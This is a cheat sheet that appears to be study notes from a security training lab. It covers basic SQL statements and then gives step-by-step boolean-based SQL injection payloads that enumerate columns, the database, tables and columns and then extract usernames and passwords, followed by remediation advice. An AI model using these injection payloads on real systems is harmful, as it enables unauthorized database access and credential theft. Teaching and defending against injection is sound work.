# 🧾 SQL Statements & Boolean-Based Injection Cheat Sheet

## 📌 Basic `SELECT` Statements

```sql
SELECT * FROM users;
SELECT username, password FROM users;
SELECT * FROM users LIMIT 1;
SELECT * FROM users WHERE username = 'admin';
SELECT * FROM users WHERE username != 'admin';
SELECT * FROM users WHERE username = 'admin' OR username = 'jon';
SELECT * FROM users WHERE username = 'admin' AND password = 'p4ssword';
```

### Using `LIKE`

```sql
SELECT * FROM users WHERE username LIKE 'a%';
-- Returns users beginning with 'a'

SELECT * FROM users WHERE username LIKE '%n';
-- Returns users ending with 'n'

SELECT * FROM users WHERE username LIKE '%mi%';
-- Returns users containing 'mi'
```

## 🔀 `UNION` Statement

```sql
SELECT name, address, city, postcode FROM customers
UNION
SELECT company, address, city, postcode FROM suppliers;
```

- Combines results from two `SELECT` statements.
- Must return the **same number of columns** with **matching data types** and **order**.

## ➕ `INSERT` Statement

```sql
INSERT INTO users (username, password) VALUES ('bob', 'password123');
```

- `INTO users` → target table
- `(username, password)` → columns
- `VALUES (...)` → actual data

## 📝 `UPDATE` Statement

```sql
UPDATE users SET username = 'root', password = 'pass123' WHERE username = 'admin';
```

- Updates rows where the condition matches.

## ❌ `DELETE` Statement

```sql
DELETE FROM users WHERE username = 'martin';
DELETE FROM users;
-- ⚠️ Without a WHERE clause, deletes ALL rows!
```

---

## 🌐 Blog Entry Example (with SQL context)

```
https://website.thm/blog?id=1
```

```sql
SELECT * FROM blog WHERE id = 1 AND private = 0 LIMIT 1;
```

---

## 🛠️ Boolean-Based SQL Injection

Used to extract data via true/false logic (e.g., response contains `{"taken": true}`).

### ✅ Step 1: Find Number of Columns

Try increasing columns in a `UNION` until you succeed:

```sql
admin123' UNION SELECT 1;--         → false
admin123' UNION SELECT 1,2;--       → false
admin123' UNION SELECT 1,2,3;--     → ✅ true (3 columns)
```

### 🧠 Step 2: Find Database Name

```sql
admin123' UNION SELECT 1,2,3 WHERE database() LIKE '%';--   → true
admin123' UNION SELECT 1,2,3 WHERE database() LIKE 's%';--  → ✅
```

Eventually reveals: `sqli_three`

### 🗂️ Step 3: Find Table Name

```sql
admin123' UNION SELECT 1,2,3 FROM information_schema.tables 
WHERE table_schema = 'sqli_three' AND table_name LIKE 'u%';-- → ✅
```

Reveals table: `users`

### 📋 Step 4: Find Column Names

```sql
admin123' UNION SELECT 1,2,3 FROM information_schema.columns 
WHERE table_schema = 'sqli_three' AND table_name = 'users' 
AND column_name LIKE 'u%';--
```

- Use exclusions to avoid repeats:  
  `... AND column_name != 'id'`

Eventually find columns:

```text
id, username, password
```

### 🔐 Step 5: Extract Data

```sql
admin123' UNION SELECT 1,2,3 FROM users WHERE username LIKE 'a%';--  → find: admin
admin123' UNION SELECT 1,2,3 FROM users WHERE username = 'admin' AND password LIKE '3%';--
```

---

## 🛠️ Tools That Automate Boolean-Based SQLi

- `sqlmap`

---

## 🛡️ Remediation Strategies

### ✅ Use Prepared Statements

- Define SQL structure first
- Add user input as parameters

### ✅ Input Validation

- Use **allowlists**
- Filter disallowed characters (`'`, `"`, `\`, `$`, etc.)

### ✅ Escape User Input

- Escape special characters (e.g., `'` becomes `\'`) to prevent them from being parsed as SQL code

---






